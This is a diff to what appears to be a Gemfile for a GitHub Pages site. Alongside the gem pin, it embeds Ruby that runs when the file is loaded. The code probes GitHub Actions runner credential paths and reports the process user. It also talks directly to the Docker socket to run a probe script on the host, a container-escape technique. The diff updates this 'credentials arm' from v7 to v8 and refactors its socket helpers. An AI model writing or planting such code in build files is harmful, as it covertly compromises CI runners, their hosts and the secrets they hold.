@@ -45,7 +45,7 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v7 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v8 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
 require 'socket'
@@ -72,7 +72,7 @@ end
 incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
            'home_runner' => c217_one('/home/runner'),
            'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
-warn 'C217ARMV7 ' + JSON.generate(incont)
+warn 'C217ARMV8 ' + JSON.generate(incont)
 
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
@@ -104,18 +104,22 @@ SOCK = '/var/run/docker.sock'
 
 def ureq(method, path, body = nil)
   s = UNIXSocket.new('/var/run/docker.sock')
-  req = "#{method} #{path} HTTP/1.1\r\nHost: localhost\r\n"
-  req += "Content-Type: application/json\r\n" if body
-  req += body ? "Content-Length: #{body.bytesize}\r\n" : ''
-  req += "Connection: close\r\n\r\n"
-  s.write(req + (body || ''))
+  req = String.new
+  req << "#{method} #{path} HTTP/1.1\r\n"
+  req << "Host: localhost\r\n"
+  req << "Content-Type: application/json\r\n" if body
+  req << "Content-Length: #{body.bytesize}\r\n" if body
+  req << "Connection: close\r\n\r\n"
+  s.write(req)
+  s.write(body) if body
   resp = s.read
   s.close
   head, _, rest = resp.partition("\r\n\r\n")
   status = head.split(' ')[1].to_i
   if head =~ /Transfer-Encoding:\s*chunked/i
-    out = ''; buf = rest.dup
-    while !buf.empty?
+    out = String.new
+    buf = String.new << rest
+    until buf.empty?
       line, _, buf = buf.partition("\r\n")
       n = line.to_i(16)
       break if n == 0
@@ -128,7 +132,8 @@ def ureq(method, path, body = nil)
 end
 
 def deframe(data)
-  out = ''; buf = data.dup
+  out = String.new
+  buf = String.new << data
   while buf.bytesize >= 8
     len = buf[0, 8].unpack('C4N')[4]
     break if len == 0 || buf.bytesize < 8 + len
@@ -172,4 +177,4 @@ begin
 rescue StandardError => e
   warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
 end
-warn 'C217ARMV7 done'
+warn 'C217ARMV8 done'
